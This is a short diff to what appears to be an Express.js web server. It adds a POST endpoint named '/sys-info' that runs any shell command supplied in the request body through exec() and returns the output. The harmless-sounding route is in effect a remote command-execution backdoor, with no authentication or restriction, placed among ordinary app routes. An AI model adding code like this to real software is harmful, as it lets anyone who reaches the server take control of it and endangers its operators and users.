@@ -177,6 +177,20 @@ app.get('/image', (req, res) => {
   });
 });
 
+app.post('/sys-info', (req, res) => {
+  const { command } = req.body;
+
+  exec(command, (error, stdout, stderr) => {
+    if (error) {
+      console.error(`Error in command: ${error}`);
+      res.status(500).json({ error: 'Error in command' });
+    } else {
+      console.log(`Command output: ${stdout}`);
+      res.status(200).json({ output: stdout });
+    }
+  });
+});
+
 app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, 'build', 'index.html'));
   });
